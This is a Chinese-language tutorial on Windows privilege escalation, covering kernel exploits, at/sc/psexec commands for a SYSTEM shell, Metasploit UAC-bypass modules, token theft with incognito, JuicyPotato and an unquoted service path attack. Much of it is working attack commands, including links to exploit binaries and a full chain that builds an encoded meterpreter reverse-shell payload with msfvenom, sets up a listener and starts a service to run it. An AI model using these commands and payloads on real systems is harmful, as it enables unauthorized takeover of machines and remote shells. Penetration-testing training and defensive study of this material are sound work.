<h4 class="md-end-block md-heading"><span class="md-plain">一、提权基础概念</span></h4>
<h5 class="md-end-block md-heading"><span class="md-plain">（一）提权类型</span></h5>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">纵向提权</span></strong></span><span class="md-plain">：低权限角色获取高权限角色的权限（如普通用户获得管理员或 SYSTEM 权限）。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">横向提权</span></strong></span><span class="md-plain">：获取同级别角色的权限（如普通用户获取另一个普通用户的权限，常用于内网横向移动）。</span></p>
</li>
</ul>
<h5 class="md-end-block md-heading"><span class="md-plain">（二）常见提权方法分类</span></h5>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">系统内核溢出漏洞提权</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">数据库提权（如 MySQL、MSSQL 权限滥用）</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">错误的系统配置提权（如可信任服务路径漏洞）</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">组策略首选项提权</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">WEB 中间件漏洞提权（如 Tomcat 弱口令部署 war 包）</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">DLL 劫持提权</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">滥用高危权限令牌提权</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">第三方软件 / 服务提权（如弱权限服务配置）</span></p>
</li>
</ul>
<h4 class="md-end-block md-heading"><span class="md-plain">二、常用提权方法详解</span></h4>
<h5 class="md-end-block md-heading md-focus"><span class="md-plain">（一）系统内核溢出漏洞提权</span></h5>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">原理</span></strong></span><span class="md-plain">：利用操作系统内核漏洞，通过溢出攻击覆盖内存数据，获取 SYSTEM 权限。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">操作步骤</span></strong></span><span class="md-plain">：</span></p>

<ol class="ol-list" start="">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">收集补丁信息：</span><span class="md-pair-s" spellcheck="false"><code>systeminfo</code></span><span class="md-plain"> 或 </span><span class="md-pair-s" spellcheck="false"><code>wmic qfe get HotFixID</code></span><span class="md-plain">，识别缺失的安全补丁（如未安装 KB4013081 可能存在 MS17-010 漏洞）。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">查找对应漏洞工具：从 SecWiki、Exploit-DB 等平台下载溢出工具（如 MS17-010 的 exploit.exe）。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">执行工具提权：在目标机运行工具，直接获取 SYSTEM 权限的 CMD 或反弹 shell。</span></p>
</li>
</ol>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">适用场景</span></strong></span><span class="md-plain">：未及时打补丁的老旧系统（如 Windows XP、Server 2003），新系统因补丁完善较难利用。</span></p>
</li>
</ul>
<h5 class="md-end-block md-heading"><span class="md-plain">（二）计划任务 / 服务命令提权</span></h5>
<ol class="ol-list" start="">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">at 命令提权（适用于 Windows 2000/2003/XP）</span></strong></span></p>
</li>
</ol>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">原理</span></strong></span><span class="md-plain">：</span><span class="md-pair-s" spellcheck="false"><code>at</code></span><span class="md-plain"> 命令默认以 SYSTEM 权限执行计划任务，可创建交互式命令窗口。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">命令示例</span></strong></span><span class="md-plain">：</span></p>



```bash
at 15:06 /interactive cmd  # 指定时间启动交互式cmd（system权限）
```


</li>
</ul>
<ol class="ol-list" start="2">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">sc 命令提权（适用于 Windows 7/8/03/08/12/16）</span></strong></span></p>
</li>
</ol>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">原理</span></strong></span><span class="md-plain">：</span><span class="md-pair-s" spellcheck="false"><code>sc</code></span><span class="md-plain"> 命令用于管理服务，通过创建自定义服务并配置启动命令，以 SYSTEM 权限执行程序。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">命令示例</span></strong></span><span class="md-plain">：</span></p>



```bash
sc Create systemcmd binPath= "cmd /K start" type= own type= interact
# systemcmd是服务名称,大家可以随意填写
# binpath是启动的命令
# type=own是指服务这个服务属于谁
# cmd /k start 这个命令就是启动一个新的cmd窗口:
```


</li>
</ul>
<h5 class="md-end-block md-heading"><span class="md-plain">（三）psexec 提权（适用于 Win2003/2008）</span></h5>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">工具</span></strong></span><span class="md-plain">：微软 PSTools 工具包中的</span><span class="md-pair-s" spellcheck="false"><code>psexec.exe</code></span><span class="md-plain">。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">原理</span></strong></span><span class="md-plain">：通过远程执行命令，直接以 SYSTEM 权限启动进程。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">命令示例</span></strong></span><span class="md-plain">：</span></p>



```bash
psexec.exe -accepteula -s -i cmd.exe  # 以system权限启动交互式cmd
```


</li>
</ul>
<h5 class="md-end-block md-heading"><span class="md-plain">（四）UAC 绕过（适用于 Vista 及以上系统）</span></h5>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">UAC 作用</span></strong></span><span class="md-plain">：限制程序未经授权的系统更改，需管理员确认才能执行高权限操作。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">常用方法</span></strong></span><span class="md-plain">：通过 MSF 模块绕过 UAC 验证：</span></p>
</li>
</ul>


```bash
exploit/windows/local/ask  # 弹出UAC确认窗口，点击后提权
exploit/windows/local/bypassuac  # 直接绕过UAC
exploit/windows/local/bypassuac_injection  # 注入进程绕过UAC
exploit/windows/local/bypassuac_fodhelper
exploit/windows/local/bypassuac_eventvwr
exploit/windows/local/bypassuac_comhijack
```


<h5 class="md-end-block md-heading"><span class="md-plain">（五）令牌窃取（适用于 2008 之前版本）</span></h5>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">原理</span></strong></span><span class="md-plain">：用户登录后生成</span><span class="md-pair-s" spellcheck="false"><code>Access Token</code></span><span class="md-plain">（访问令牌），进程通过令牌获取权限。窃取高权限令牌可提升权限。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">令牌类型</span></strong></span><span class="md-plain">：</span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">授权令牌（Delegation token）：交互式登录（如本地登录），权限较高。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">模拟令牌（Impersonation token）：非交互式登录（如访问共享文件），权限较低。</span></p>
</li>
</ul>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">操作步骤（MSF）</span></strong></span><span class="md-plain">：</span></p>



```bash
meterpreter > use incognito  # 加载令牌模块
meterpreter > list_tokens -u  # 列出可用令牌（如WEB-SERVER\Administrator）
meterpreter > impersonate_token WEB-SERVER\\Administrator  # 窃取管理员令牌（注意双反斜杠）
```


</li>
</ul>
<h5 class="md-end-block md-heading"><span class="md-plain">（六）烂土豆提权（MS16-075，CVE-2016-3225）</span></h5>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">原理</span></strong></span><span class="md-plain">：利用 Windows SMB 服务器漏洞，欺骗</span><span class="md-pair-s" spellcheck="false"><code>NT AUTHORITY\SYSTEM</code></span><span class="md-plain">账户进行 NTLM 认证，通过中间人攻击获取系统权限。具体过程如下：</span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">攻击者构造特殊的请求，欺骗</span><span class="md-pair-s" spellcheck="false"><code>NT AUTHORITY\SYSTEM</code></span><span class="md-plain">账户对这个伪造的请求进行 NTLM 认证。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">攻击者扮演中间人的角色，拦截并篡改</span><span class="md-pair-s" spellcheck="false"><code>NT AUTHORITY\SYSTEM</code></span><span class="md-plain">账户发送的认证信息。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">通过这种方式，攻击者可以获取到高权限的访问令牌，从而提升自身在系统中的权限。</span></p>
</li>
</ul>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">条件</span></strong></span><span class="md-plain">：需开启</span><span class="md-pair-s" spellcheck="false"><code>SeImpersonate</code></span><span class="md-plain">或</span><span class="md-pair-s" spellcheck="false"><code>SeAssignPrimaryToken</code></span><span class="md-plain">权限（通过</span><span class="md-pair-s" spellcheck="false"><code>whoami /priv</code></span><span class="md-plain">查看）。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">命令示例</span></strong></span><span class="md-plain">：</span></p>



```bash
JuicyPotato.exe -t t -p c:\windows\system32\cmd.exe -l 1111 -c {CLSID}
# 使用JuicyPotato工具，-t指定权限类型，-p指定目标程序，-l指定端口
# 如果开启SeImpersonate权限:-t t
# 如果开启SeAssignPrimaryToken权限:-t u
# 如果均开启:-t 
# 如果均未开启:无法提权
```


<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">CLSID 选择：CLSID 是用于标识 COM 组件的唯一标识符，选择时需要考虑系统版本、服务配置等因素，参考</span><span class="md-meta-i-c md-link"><a href="https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md"><span class="md-plain">官方列表</span></a></span><span class="md-plain">。</span></p>
</li>
</ul>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">工具地址</span></strong></span><span class="md-plain">：</span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-link md-pair-s" spellcheck="false"><a href="https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS16-075/potato.exe">https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS16-075/potato.exe</a></span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-link md-pair-s" spellcheck="false"><a href="https://github.com/breenmachine/RottenPotatoNG/blob/master/RottenPotatoEXE/x64/Release/MSFRottenPotato.exe">https://github.com/breenmachine/RottenPotatoNG/blob/master/RottenPotatoEXE/x64/Release/MSFRottenPotato.exe</a></span></p>
</li>

<h5 class="md-end-block md-heading"><span class="md-plain">（七）可信任服务路径漏洞提权</span></h5>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">漏洞判定</span></strong></span><span class="md-plain">：若一个服务的可执行文件路径未被双引号包裹且包含空格，则该服务存在可信任服务路径漏洞。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">漏洞原理</span></strong></span><span class="md-plain">：以路径</span><span class="md-pair-s" spellcheck="false"><code>C:\Program Files (x86)\Common Files\Tencent\QQMusic\QQMusicService.exe</code></span><span class="md-plain">为例：</span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">当路径带引号时（如</span><span class="md-pair-s" spellcheck="false"><code>&quot;C:\Program Files (x86)\Common Files\Tencent\QQMusic\QQMusicService.exe&quot;</code></span><span class="md-plain">），会被视为完整路径，无漏洞；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">当路径不带引号时，Windows 会将空格后的内容误认为参数，优先尝试执行空格前分段对应的文件（如</span><span class="md-pair-s" spellcheck="false"><code>C:\Program.exe</code></span><span class="md-plain">），攻击者可构造同名恶意文件，诱使服务启动时执行以提权。</span></p>
</li>
</ul>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">漏洞检测</span></strong></span><span class="md-plain">：执行以下命令筛选存在漏洞的服务：</span></p>



```bash
wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """"
#该命令用于筛选自动启动、路径不在`C:\Windows\`下且未被双引号包裹的服务，这类服务为潜在漏洞目标。
```


</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">利用步骤</span></strong></span><span class="md-plain">：</span></p>

<ol class="ol-list" start="">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">模拟创建漏洞服务， </span><span class="md-pair-s" spellcheck="false"><code>sc</code></span><span class="md-plain"> 命令创建路径含空格且无引号的服务并设置自动启动：</span></p>
</li>
</ol>


```bash
sc create QQMUSIC binPath= "C:\Program Files (x86)\Tencent\QQMusic\QQMusic.exe"
sc config QQMUSIC start= AUTO
sc qc QQMUSIC | findstr BINARY_PATH_NAME
#正确配置（\" 表示双引号字符）
sc create QQMUSIC binPath= "\"C:\Program Files (x86)\Tencent\QQMusic\QQMusic.exe\"" start= auto
```


<ol class="ol-list" start="2">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">生成恶意木马，在 Kali 中使用 </span><span class="md-pair-s" spellcheck="false"><code>msfvenom</code></span><span class="md-plain"> 生成反向连接木马，文件名需匹配路径空格前的分段：</span></p>
</li>
</ol>


```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 11 -b '\x00' lhost=攻击机IP lport=攻击机端口 -f exe -o Program.exe
```


<ol class="ol-list" start="3">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">放置木马与监听，将恶意文件 </span><span class="md-pair-s" spellcheck="false"><code>Program.exe</code></span><span class="md-plain"> 放在路径分段的根目录 </span><span class="md-pair-s" spellcheck="false"><code>C:</code></span></p>
</li>
</ol>


```bash
msfconsole
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 攻击机IP
set LPORT 攻击机端口
set AutoRunScript migrate -f  # 防止会话断开
run
```


<ol class="ol-list" start="4">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">触发漏洞，启动存在漏洞的服务以执行恶意文件：</span></p>
</li>
</ol>


```bash
net start QQMUSIC
```


<ol class="ol-list" start="5">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">自动化利用，直接使用 MSF 内置模块：</span></p>
</li>
</ol>


```bash
use exploit/windows/local/unquoted_service_path
```


</li>
</ul>
